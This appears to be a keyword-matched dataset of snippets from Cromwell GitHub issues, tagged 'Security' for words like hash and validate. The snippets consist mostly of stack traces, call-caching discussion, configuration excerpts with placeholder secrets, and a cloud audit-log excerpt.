Security,.relevantAsUpstream$1(GraphPrint.scala:178); 	at wom.views.GraphPrint$.upstreamPortToRelevantNodes$1(GraphPrint.scala:187); 	at wom.views.GraphPrint$.$anonfun$upstreamLinks$1(GraphPrint.scala:190); 	at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); 	at scala.collection.immutable.Set$Set1.foreach(Set.scala:97); 	at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); 	at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); 	at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); 	at wom.views.GraphPrint$.upstreamLinksforNode$1(GraphPrint.scala:190); 	at wom.views.GraphPrint$.relevantAsUpstream$1(GraphPrint.scala:176); 	at wom.views.GraphPrint$.upstreamPortToRelevantNodes$1(GraphPrint.scala:187); 	at wom.views.GraphPrint$.$anonfun$upstreamLinks$1(GraphPrint.scala:190); 	at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); 	at scala.collection.immutable.HashSet$HashSet1.foreach(HashSet.scala:321); 	at scala.collection.immutable.HashSet$HashTrieSet.foreach(HashSet.scala:977); 	at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); 	at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); 	at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); 	at wom.views.GraphPrint$.upstreamLinksforNode$1(GraphPrint.scala:190); 	at wom.views.GraphPrint$.upstreamLinks(GraphPrint.scala:191); 	at wom.views.GraphPrint.$anonfun$listAllGraphNodes$2(GraphPrint.scala:33); 	at scala.collection.Iterator$$anon$10.next(Iterator.scala:459); 	at scala.collection.Iterator.foreach(Iterator.scala:941); 	at scala.collection.Iterator.foreach$(Iterator.scala:941); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1429); 	at scala.collection.TraversableOnce.foldLeft(TraversableOnce.scala:160); 	at scala.collection.TraversableOnce.foldLeft$(TraversableOnce.scala:158); 	at scala.collection.AbstractIterator.foldLeft(Iterator.scala:1429); ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6744:3455,Hash,HashSet,3455,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6744,1,['Hash'],['HashSet']
Security,.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Class cromwell.services.womtool.impl.WomtoolServiceInCromwellActor for service Womtool cannot be found in the class path.; 	at cromwell.services.ServiceRegistryActor$.serviceProps(ServiceRegistryActor.scala:54); 	at cromwell.services.ServiceRegistryActor$.$anonfun$serviceNameToPropsMap$2(ServiceRegistryActor.scala:37); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:36); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; Caused by: java.lang.ClassNotFoundException,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:3981,Hash,HashMap,3981,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['Hash'],['HashMap']
Security,".toString)`]. Other caching options:. - `system.file-hash-cache` - Prevent repeatedly requesting the hashes of the same files multiple times. - `backend.providers.Local.caching.check-sibling-md5` - will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. ## My takeaway. - I can't use a `softlink` cache duplication strategy as it's not allowed for containers. - If I select the `path+modtime` hashing strategy, only the first task in a workflow will succeed, as the hard-link duplication strategy will cause the path ""absolute"" be different (causing a hash differential). ## Questions. - ~What defines a cache hit, or exactly which information is used to the call hash?~; > I'll answer this one myself, by looking at the metadata returned from `/api/workflows/{version}/{id}/metadata`, within the `calls.$yourstepname.callCaching`, the hashes field has the following attributes:; > - `output count`; > - `runtime attribute`; > - `output expression`; > - `input count`; > - `backend name`; > - `command template`; > - `input`. - ~When does the command section get hashed (before or after replacements)?~; > The template gets cached. - ~What other elements go into the building the cache?~; > output count, runtime attribute, output expression, input count, backend name, command template, input. - What are the downsides with `check-sibling-md5`, can it be used in conjunction with `system.file-hash-cache`. - **Is the only way to use call-caching with containers without fully hashing the file?**. ## Possible resolutions. I was thinking the following might be potential solutions for my problem, but I don't know how good / bad they are, and they'd require changes to Cromwell. - Potential for a _cheaper_ (and potentially dirtier) hash for files? ; - When cromwell links from a cached result, store a map of { newpath : original } link to use or call caching, so when the hashDifferential is calculated, it uses the hash",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:2683,hash,hashes,2683,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,1,['hash'],['hashes']
Security,.toWomBundle(FileElementToWomBundle.scala:75); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWomBundle(FileElementToWomBundle.scala:30); wom.transforms.WomBundleMaker$Ops.toWomBundle(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$Ops.toWomBundle$(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$ops$$anon$2.toWomBundle(WomExecutableMaker.scala:16); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$.convert(FileElementToWomBundle.scala:82); wdl.draft3.transforms.wdlom2wom.package$.$anonfun$fileElementToWomBundle$1(package.scala:13); scala.util.Either$RightProjection.flatMap(Either.scala:702); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:36); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:32); cats.data.Kleisli.$anonfun$andThen$1(Kleisli.scala:37); languages.wdl.draft3.WdlDraft3LanguageFactory.getWomBundle(WdlDraft3LanguageFactory.scala:50); languages.wdl.draft3.WdlDraft3LanguageFactory.$anonfun$validateNamespace$2(WdlDraft3LanguageFactory.scala:39); scala.util.Either.flatMap(Either.scala:338); languages.wdl.draft3.WdlDraft3LanguageFactory.validateNamespace(WdlDraft3LanguageFactory.scala:38); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$buildWorkflowDescriptor$7(MaterializeWorkflowDescriptorActor.scala:242); cats.data.EitherT.$anonfun$flatMap$1(EitherT.scala:80); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:128); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Prom,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:8501,validat,validateNamespace,8501,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validateNamespace']
Security,.traverse(vector.scala:12); cats.Traverse$Ops.traverse(Traverse.scala:19); cats.Traverse$Ops.traverse$(Traverse.scala:19); cats.Traverse$ToTraverseOps$$anon$3.traverse(Traverse.scala:19); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$5(FileElementToWomBundle.scala:51); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWorkflowInner$1(FileElementToWomBundle.scala:48); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$14(FileElementToWomBundle.scala:77); scala.Function2.$anonfun$tupled$1(Function2.scala:48); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); common.validation.ErrorOr$ShortCircuitingFlatMapTuple2$.flatMapN$extension(ErrorOr.scala:49); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$12(FileElementToWomBundle.scala:77); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWomBundle(FileElementToWomBundle.scala:75); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWomBundle(FileElementToWomBundle.scala:30); wom.transforms.WomBundleMaker$Ops.toWomBundle(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$Ops.toWomBundle$(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$ops$$anon$2.toWomBundle(WomExecutableMaker.scala:16); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$.convert(FileElementToWomBundle.scala:82); wdl.draft3.transforms.wdlom2wom.package$.$anonfun$fileElementToWomBundle$1(package.scala:13); scala.util.Either$RightProjection.flatMap(Either.scala:702); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:36); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:32); cats.data.Kleisli.$anonfun$andThen$1(Kleisli.scala:37); languages.wdl.draft3.WdlDraft3La,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:7377,validat,validation,7377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validation']
Security,.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.fetchLocallyQualifiedInputs(WorkflowActor.scala:962) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$processRunnableCall(WorkflowActor.scala:1254) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:868) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467) ~[cromwell.jar:0.19]; at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36) ~[cromwell.jar:0.19]; at akka.actor.FSM$class.processEvent(FSM.scala:604) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowActor.scala:236) ~[cromwell.jar:0.1,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:5896,Hash,HashMap,5896,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,1,['Hash'],['HashMap']
Security,"/ Since the WorkflowLogCopyRouter is initialized in code, this is the number of workers; number-of-workflow-log-copy-workers = 10; }. workflow-options {; // These workflow options will be encrypted when stored in the database; encrypted-fields: []. // AES-256 key to use to encrypt the values in `encrypted-fields`; base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="". // Directory where to write per workflow logs; workflow-log-dir: ""cromwell-workflow-logs"". // When true, per workflow logs will be deleted after copying; workflow-log-temporary: true. // Workflow-failure-mode determines what happens to other calls when a call fails. Can be either ContinueWhilePossible or NoNewCalls.; // Can also be overridden in workflow options. Defaults to NoNewCalls. Uncomment to change:; //workflow-failure-mode: ""ContinueWhilePossible""; }. // Optional call-caching configuration.; call-caching {; enabled = true. // The Docker image specified in the 'runtime' section of a task can be used as-is; // or Cromwell can lookup this Docker image to get a complete hash. For example,; // if a task specifies docker: ""ubuntu:latest"" and if lookup-docker-hash is true,; // Then Cromwell would query DockerHub to resolve ""ubuntu:latest"" to something like; // a2c950138e95bf603d919d0f74bec16a81d5cc1e3c3d574e8d5ed59795824f47; //; // A value of 'true' means that call hashes will more accurately represent the; // Docker image that was used to run the call, but at a cost of having to make a; // request to an external service (DockerHub, GCR). If a call fails to lookup a; // Docker hash, it will fail.; lookup-docker-hash = false; }. google {. application-name = ""cromwell"". auths = [; {; name = ""application-default""; scheme = ""application_default""; },; {; name = ""user-via-refresh""; scheme = ""refresh_token""; client-id = ""secret_id""; client-secret = ""secret_secret""; },; {; name = ""service-account""; scheme = ""service_account""; service-account-id = ""my-service-account""; pem-file = ""/path/to/fil",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:86249,hash,hash,86249,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,1,['hash'],['hash']
Security,"/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam -> /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD; /DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam (cp failed: gsutil -q -m cp gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A2; 5E-08.2.bam /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam, command failed: Traceback (most recent call last):\n; File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 75, in <module>\n main()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.; py\"", line 22, in main\n project, account = bootstrapping.GetActiveProjectAndAccount()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/bootstrapping.py\"", line 205,; in GetActiveProjectAndAccount\n project_name = properties.VALUES.core.project.Get(validate=False)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py; \"", line 1221, in Get\n required)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1501, in _GetProperty\n value = _GetPropertyWithoutD; efault(prop, properties_file)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1539, in _GetPropertyWithoutDefault\n value = callback()\n; File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 693, in _GetGCEProject\n return c_gce.Metadata().Project()\n File \""/usr/local/share/googl; e/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 104, in Project\n gce_read.GOOGLE_GCE_METADATA_PROJECT_URI)\n File \""/usr/local/share/google/google-cloud-sdk/lib/g; ooglecloudsdk/core/util/retry.py\"", line 155, in TryFunc\n return func(*args, **kwargs), None\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.p; y\"", line 41, ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:3697,validat,validate,3697,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['validat'],['validate']
Security,/describe endpoint validates workflows,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4467:19,validat,validates,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4467,1,['validat'],['validates']
Security,"/github.com/broadinstitute/wdl4s/issues/248#issuecomment-334536133). I think this comment is more appropriate here:. Equals is supposed to be bitwise/value-based equality, whereas `eq` indicates reference equality. I don't recall the exact motivation behind using `eq` in the test, maybe @cjllanwarne can comment when he returns on Tuesday. ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334555964). If you don't like this fix, what do you suggest we do instead? How about we accept this fix now and you can rework the whole thing later, if you want?. This is a show-stopper once you want to create larger (aka real-life) workflows. . For example: if node a has two outputs, which are inputs of b, then b.hashCode calls a.hasCode twice. If b produces two outputs which are inputsof c, then c.hashCode calls b.hashCode twice, and a.hashCode is called four times. If c produces two outputs which are inputs of d, d.hashCode calls c.hashCode twice, b.hashCode four times and a.hashCode eight times, etc. . ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334557027). `eq` is object equality. `equals` and `==` are the same, and there is no general rule that they need to be component-based (""bitwise""). On the contrary, `equals`/`==` should not be component-based if an object is mutable. Your typical GraphNode is mutable, because it indirectly contains `GraphNodeSetter`. ---. @danbills commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334575875). I suggest we leave this as-is with the understanding that it could be a performance issue down the road. . >rework the whole thing later. This is a specific anti-goal. As I suggested, I would like to discuss w/ Chris when he gets back next week as we introduced the reference equality in the first place and I'm not aware of his motivation to do so. ---. @curoli commented on [Thu Oct 05",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2694:1834,hash,hashCode,1834,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2694,2,['hash'],['hashCode']
Security,"/mccarroll-mocha; page_size: 100; requestMetadata:; callerIp: 64.112.179.105; callerSuppliedUserAgent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101; Firefox/80.0,gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T03:28:37.843325531Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T03:28:38.742413691Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T03:28:37.734190692Z'; ```. Sometimes like this instead:; ```; insertId: 1mk6qq6ek68fs; logName: projects/mccarroll-mocha/logs/cloudaudit.googleapis.com%2Fdata_access; protoPayload:; '@type': type.googleapis.com/google.cloud.audit.AuditLog; authenticationInfo:; principalEmail: google@broadinstitute.com; principalSubject: user:google@broadinstitute.com; authorizationInfo:; - granted: true; permission: iam.serviceAccounts.list; resource: projects/mccarroll-mocha; resourceAttributes: {}; methodName: google.iam.admin.v1.ListServiceAccounts; request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; requestMetadata:; callerIp: 69.173.70.180; callerSuppliedUserAgent: (gzip),gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T11:58:49.543410910Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T11:58:49.691467944Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T11:58:49.452628092Z'; ```. The principalEmail sometimes is `giulio@broadinstitute.org` and sometimes is `google@broadinstitute.com` so I am not sure what these requests are for.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080:1693,authoriz,authorizationInfo,1693,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080,1,['authoriz'],['authorizationInfo']
Security,"/usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/_libs/__init__.py:4: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from .tslib import iNaT, NaT, Timestamp, Timedelta, OutOfBoundsDatetime; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/__init__.py:26: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (hashtable as _hashtable,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/dtypes/common.py:6: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos, lib; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/util/hashing.py:7: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import hashing, tslib; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/indexes/base.py:7: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (lib, index as libindex, tslib as libts,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/tseries/offsets.py:21: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; import pandas._libs.tslibs.offsets as liboffsets; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/ops.py:16: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos as libalgos, ops as libops; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/indexes/interval.py:32: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs.interval import (; /usr/lo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277:1462,hash,hashing,1462,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277,1,['hash'],['hashing']
Security,"0. workflow wdl_v1_tests {; scatter (x in [0]) {; scatter (y in [0]) {; call input_default_not_used; }; }; }. task input_default_not_used {; input { String greeting = ""hello"" }; command { echo ~{greeting} }; runtime { docker: ""bash"" }; }; ```. ```; [2018-06-08 01:30:26,49] [error] WorkflowManagerActor Workflow 58ccc276-40f7-447c-bbff-87a47aa7163e failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; key not found: wdl_v1_tests.input_default_not_used.greeting; scala.collection.immutable.Map$Map1.apply(Map.scala:111); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.$anonfun$convertInnerScatter$8(ScatterElementToGraphNode.scala:103); scala.collection.immutable.List.map(List.scala:283); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.$anonfun$convertInnerScatter$7(ScatterElementToGraphNode.scala:102); cats.data.Validated.map(Validated.scala:194); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.convertInnerScatter(ScatterElementToGraphNode.scala:99); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.convert(ScatterElementToGraphNode.scala:31); wdl.draft3.transforms.wdlom2wom.graph.WorkflowGraphElementToGraphNode$.convert(WorkflowGraphElementToGraphNode.scala:49); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:82); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.graphNodeCreationFold$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:77); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$6(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); scala.collection.LinearSeqOptimized.foldLe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:1075,Validat,Validated,1075,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['Validat'],['Validated']
Security,"0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImp",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7379,secur,security,7379,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"0.4 is the latest release... according to github... (Yes, I realize that there have been tags since, but in the past, I had; been told to avoid these). On Tue, Jan 10, 2017 at 4:24 PM, Thib <notifications@github.com> wrote:. > It's expected that wdltool 0.4 will not validate this as the String; > main_output = hello_and_goodbye.hello_output syntax in workflow outputs; > was introduced specifically for sub workflows which wdltool 0.4 pre-dates.; > Try to update to the latest version of wdltool and it should validate.; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271702261>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk2mhGzhFvb8rAvqTnkXnmX_L-KYAks5rQ_bwgaJpZM4Lf57n>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 